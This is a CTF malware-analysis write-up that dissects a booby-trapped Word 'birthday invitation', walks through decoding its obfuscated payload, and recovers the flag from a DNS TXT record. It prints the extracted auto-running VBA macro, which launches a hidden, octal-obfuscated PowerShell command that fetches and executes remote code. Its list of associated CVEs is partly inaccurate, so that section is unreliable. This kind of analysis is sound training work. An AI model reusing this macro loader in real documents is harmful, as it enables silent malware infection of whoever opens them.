# RedFox CTF Writeup - Kratos' Rage 

| Field | Value |
|-------|--------|
| **CTF** | RedFox CTF 2026 |
| **Category** | Reverse Engineering |


##  Challenge Overview

**Name:** Kratos' Rage\
**Category:** Malware Analysis / Forensics\
**Objective:** Analyze a malicious Word document and uncover the hidden flag.

---

##  Initial Analysis

We are given a suspicious Word document:

**File:** `Atreus_Birthday.doc` 

The challenge description hints:

* A **birthday invitation**
* But opening it causes a **“thunderbolt” attack**
* Suggesting **macro-based malware**

---

##  Static File Inspection

Run:

```bash
file Atreus_Birthday.doc
```

Output:

```
Atreus_Birthday.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: Admin, Template: {4F2E9A4D-6344-4DB3-867F-0013EAC62560}TFda4bd1d7-fe8c-4b35-b475-8230a29af7d267a37262_win32-5212e308023e.dotx, Last Saved By: Siddharth Johri, Revision Number: 15, Name of Creating Application: Microsoft Office Word, Total Editing Time: 13:00, Create Time/Date: Thu Mar  5 09:42:00 2026, Last Saved Time/Date: Fri Mar  6 04:01:00 2026, Number of Pages: 1, Number of Words: 37, Number of Characters: 211, Security: 0
```

 Indicates this is a **legacy Office document with embedded macros**

---

##  Extracting Macros

We use **oletools (olevba)**:

```bash
pip install oletools --break-system-packages
olevba Atreus_Birthday.doc
```

---

##  Macro Analysis

Using `olevba`, we extracted the actual VBA macro:

```vb
Sub AutoRun()

    Dim objShell As Object
    Dim objExec As Object
    Dim cmd As String
    Dim outputLine As String

    Set objShell = CreateObject("WScript.Shell")

    cmd = "powershell.exe -nop -hidden -w ""[sTring]::joIN( '',( ( 46 , 50 , 47 ,151 , 47, 53, 47, 167, 162, 47 ,51,40 , 55 ,165,163, 145,142, 141 , 163 , 151, 143 , 160, 141 , 162 , 163,151 , 156 ,147 ,40 ,150 ,164,164,160, 163, 72 , 57,57 , 141 , 163 ,147 , 141 , 162 , 144 ,56, 162, 145 , 144,146,157,170, 163,145 , 143 ,56,143 , 157, 155 , 57,164 , 150,165 , 156, 144,145,162,142, 157,154 , 164 , 56 , 150 ,164,155,154 )| FOrEAcH-oBJEcT {([coNVErT]::Toint16( ( [stRING]$_ ),8 ) -as[CHAr]) }) ) | &( ([StRINg]$verbosEPREfeRence)[1,3]+'X'-JoIn'')"""

    objShell.Run cmd, 0, False

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|powershell          |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|IOC       |powershell.exe      |Executable file name                         |
+----------+--------------------+---------------------------------------------+

```


###  Indicators of Compromise (IOCs)

* `AutoRun()` → executes automatically
* `WScript.Shell` → executes system commands
* `powershell.exe -nop -hidden` → stealth execution
* Obfuscated numeric array → payload hiding

---

##  Technique Used (CVE + Attack Type)

###  Vulnerability / Technique

This attack uses **malicious VBA macros**, commonly associated with:

* **CVE-2017-0199**
* **CVE-2017-11882**
* **CVE-2021-40444**

###  Explanation

While this specific sample relies on **user-enabled macros**, it mimics real-world attacks:

* Social engineering lure (birthday invitation)
* Macro auto-execution
* PowerShell payload delivery

 This is a **Macro-Based Malware (Maldoc)** attack.

---

##  Payload Deobfuscation

The macro contains an **octal-encoded array**:

```text
46, 50, 47, 151, 47, 53, 47, 167, ...
```

Decoding logic:

```powershell
[String]::Join('', ((NUMBERS) | ForEach-Object {
    ([Convert]::ToInt16($_, 8) -as [Char])
}))
```

 Each number:

* Interpreted as **octal (base 8)**
* Converted → ASCII character

---

##  Decoded Output

After decoding:

```text
https://asgard.redfoxsec.com/thunderbolt.html
```

 This is the **Command & Control (C2) endpoint**

---

##  Network Investigation

Attempting:

```bash
curl https://asgard.redfoxsec.com
```

Fails due to:

* Internal DNS / CTF infrastructure

---

##  Key Insight ( DNS TXT )

Instead of HTTP access, we query DNS records:

```bash
└─$ dig TXT asgard.redfoxsec.com

; <<>> DiG 9.20.20-1-Debian <<>> TXT asgard.redfoxsec.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 3871
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1280
;; QUESTION SECTION:
;asgard.redfoxsec.com.          IN      TXT

;; ANSWER SECTION:
asgard.redfoxsec.com.   300     IN      TXT     "REDFOX{NO0ne_W1ll_M4k3_A7R3US_S4D!}"

;; Query time: 139 msec
;; SERVER: 10.0.2.3#53(10.0.2.3) (UDP)
;; WHEN: Mon Mar 23 23:11:11 IST 2026
;; MSG SIZE  rcvd: 97

```

---

##  Flag

```text
REDFOX{NO0ne_W1ll_M4k3_A7R3US_S4D!}
```

---

##  Key Learnings

###  Malware Analysis Concepts

* Macro-based malware (Maldocs)
* PowerShell obfuscation techniques
  * Macros
  * Encoded payloads
  * Hidden network indicators

---

###  CTF Techniques

* If HTTP fails → try:

  * DNS (TXT records)
  * Alternate ports
  * Internal mappings

---

###  Defensive Insight

* Disable Office macros by default
* Monitor PowerShell execution
* Detect obfuscated scripts

---

PWN by **W4RR1OR**

